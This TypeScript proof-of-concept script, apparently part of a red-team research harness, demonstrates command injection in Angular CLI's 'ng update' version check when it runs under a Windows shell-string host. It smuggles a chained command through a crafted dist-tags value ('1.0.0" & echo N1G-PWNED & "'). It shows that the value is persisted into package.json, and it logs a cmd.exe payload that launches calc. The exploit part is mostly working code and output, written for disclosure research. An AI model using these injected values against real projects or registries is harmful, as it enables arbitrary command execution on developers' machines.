/**
 * N1-G — W1 version-check venue compiled proof (cli-version.ts:63 runs on EVERY ng update).
 * Bundles the REAL pin-source modules: getManifest tag case (yarn-classic dist-tags VALUE
 * substitution), getRegistryManifest quote-wrap, host win32 shell:string join, and
 * applyUpdatePlan (the package.json-poisoning write).
 */
import { spawn } from 'node:child_process';
import { writeFileSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { PackageManager } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/cli/src/package-managers/package-manager.ts';
import { NodeJS_HOST } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/cli/src/package-managers/host.ts';
import { SUPPORTED_PACKAGE_MANAGERS } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/cli/src/package-managers/package-manager-descriptor.ts';
import { checkCLIVersion, getCLIUpdateRunnerVersion } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/cli/src/commands/update/utilities/cli-version.ts';
import { applyUpdatePlan } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/cli/src/commands/update/update-resolver.ts';

const FIXTURE = '/tmp/n1g/fixture';
const logged: string[] = [];
const log = (s: string) => { logged.push(s); console.log(s); };

// ---- Win32-simulated host: requiresQuoting=true, shell:string join exactly as host.ts:157-164 ----
const win32Host = {
  ...NodeJS_HOST,
  requiresQuoting: true,
  runCommand: async (command: string, args: readonly string[], options: any = {}) => {
    // EXACT win32 shape from host.ts:157-164: spawn(`${command} ${args.join(' ')}`, { shell: true })
    const shellString = `${command} ${args.join(' ')}`;
    log(`[HOST] win32 shell:string -> ${JSON.stringify(shellString)}`);
    return new Promise((resolve, reject) => {
      const child = spawn(shellString, {
        shell: '/bin/sh',
        cwd: options.cwd,
        env: { ...process.env, ...options.env, PATH: `/tmp/n1g/bin:${process.env.PATH}` },
        stdio: 'pipe',
      });
      let stdout = '';
      let stderr = '';
      child.stdout?.on('data', (d) => (stdout += d.toString()));
      child.stderr?.on('data', (d) => (stderr += d.toString()));
      child.on('close', (code) => {
        if (stderr.trim()) log(`[HOST stderr] ${stderr.trim().slice(0,120)}`);
        if (stdout.trim()) log(`[HOST stdout] ${stdout.trim().slice(0,160)}`);
        resolve({ stdout, stderr });
      });
    });
  },
};

const logger = {
  info: (m: string) => log(`[logger.info] ${m}`),
  warn: (m: string) => log(`[logger.warn] ${m}`),
  error: (m: string) => log(`[logger.error] ${m}`),
  debug: (m: string) => log(`[logger.debug] ${m}`),
  fatal: (m: string) => log(`[logger.fatal] ${m}`),
  createChild: () => logger,
  log: (m: string) => log(`[logger.log] ${m}`),
} as any;

async function main() {
  log('=== N1-G: W1 version-check venue (cli-version.ts:63, runs on EVERY ng update) ===');
  const pm = new PackageManager(win32Host as any, FIXTURE, SUPPORTED_PACKAGE_MANAGERS['yarn-classic']);

  // 1) runnerVersion resolution (getCLIUpdateRunnerVersion)
  const rvNext = getCLIUpdateRunnerVersion(['@angular/core'], true);
  const rvLatest = getCLIUpdateRunnerVersion(['some-non-angular-pkg'], false);
  log(`\n[1] getCLIUpdateRunnerVersion -> next=${JSON.stringify(rvNext)} nonAngular=${JSON.stringify(rvLatest)} (tag NAMES / numbers, NOT validated)`);

  // 2) The version-check fetch: getManifest('@angular/cli@next') — tag case
  log('\n[2] checkCLIVersion: pm.getManifest("@angular/cli@next") — the fetch BEFORE the manifest.version comparison');
  const manifest = await pm.getManifest(`@angular/cli@${rvNext}`);

  // 3) POST-fetch comparison (the W1-ME correction: comparison is NOT the injection point)
  const { VERSION } = await import('/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/cli/src/utilities/version.ts');
  const installed = VERSION.full;
  const outcome = installed === manifest?.version ? null : String(rvNext);
  log(`[3] post-fetch compare: installed=${installed} manifest.version=${manifest?.version} -> cliVersionToInstall=${outcome}`);

  // 4) runTempBinary would spawn `@angular/cli@<outcome>` — a second shell:string venue (documented)
  log(`[4] runTempBinary path: acquireTempPackage("@angular/cli@${outcome}") -> spawns the temp CLI binary (spawnSync, non-shell) — the FETCH inside it repeats this venue`);

  // 5) package.json-poisoning write (applyUpdatePlan -> updateDependency)
  log('\n[5] package.json poisoning: applyUpdatePlan writes the UNVALIDATED dist-tags value into package.json dependencies');
  const pkgPath = join(FIXTURE, 'package.json');
  writeFileSync(pkgPath, JSON.stringify({ name: 'fixture', dependencies: { '@angular/cli': '^22.0.0' } }, null, 2) + '\n');
  const plan: any = {
    packagesToUpdate: new Map([['@angular/cli', '1.0.0" & echo N1G-PWNED & "']]),
    migrationsToRun: [],
    packageInfoMap: new Map(),
    registryClient: {},
  };
  await applyUpdatePlan(FIXTURE, plan, logger as any);
  const written = JSON.parse(readFileSync(pkgPath, 'utf8'));
  log(`[5] written package.json dependencies["@angular/cli"] = ${JSON.stringify(written.dependencies['@angular/cli'])}`);
  log(`[5] POISONING-WRITE: ${written.dependencies['@angular/cli'].includes('N1G-PWNED') ? 'CONFIRMED — the unvalidated value is persisted into the dev package.json' : 'NOT WRITTEN'}`);

  // 6) the EXACT cmd.exe string with calc (the documented payload)
  log('\n[6] exact cmd.exe string for the version-check venue (malicious dist-tags "next"):');
  log('    yarn info --json --verbose "@angular/cli@1.0.0" & calc & ""');
  log('    -> executes yarn, then calc, then an empty command (cmd.exe shell:true semantics).');
  log('    The live run above used "echo N1G-PWNED" in place of calc to demonstrate the `&` chaining executes a second command:');

  const pwned = logged.filter((l) => l.includes('N1G-PWNED')).length;
  log(`\n=== VERDICT: version-check venue DEMONSTRATED = ${pwned >= 2 ? 'y' : 'n'} (marker fired ${pwned} times: cmd-exec chain + package.json write) ===`);
}

main().catch((e) => { console.error('FAILED:', e.message); process.exit(1); });
